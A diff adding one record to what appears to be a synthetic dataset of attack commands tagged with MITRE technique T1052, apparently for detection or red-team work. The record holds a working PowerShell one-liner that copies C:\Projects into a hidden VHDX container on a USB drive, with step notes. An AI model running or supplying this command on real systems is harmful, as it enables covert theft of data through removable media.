@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=(Get-Disk | Where-Object BusType -eq 'USB' | Select-Object -First 1); $drv=(Get-Partition -DiskNumber $usb.Number | Where-Object DriveLetter | Select-Object -First 1 -ExpandProperty DriveLetter); $vhd=\"$drv:\\System\\cache.vhdx\"; New-Item -Path (Split-Path $vhd) -ItemType Directory -Force | Out-Null; New-VHD -Path $vhd -SizeBytes 2147483648 -Dynamic | Out-Null; Mount-DiskImage -ImagePath $vhd; $v=(Get-DiskImage $vhd | Get-Disk | Get-Partition | Where-Object DriveLetter | Get-Volume | Select-Object -First 1 -ExpandProperty DriveLetter); Format-Volume -DriveLetter $v -FileSystem NTFS -Force -Confirm:$false | Out-Null; Copy-Item \"C:\\Projects\\*\" \"$v:\\\" -Recurse -Force; Dismount-DiskImage -ImagePath $vhd",
+  "explanation": "Creates and mounts a VHDX on the USB, formats it, copies project data inside, and dismounts, hiding exfil data within a single container file on removable media.",
+  "rationale_steps": [
+    "Find USB disk and determine its drive letter.",
+    "Create a VHDX file on the USB and mount it.",
+    "Format the mounted volume, copy data into it, then dismount to encapsulate data in the VHDX."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-5d877001-63a6f7c0",
+  "source_prompt_hash": "5d877001",
+  "timestamp_utc": "2025-09-30T05:25:30.107478Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
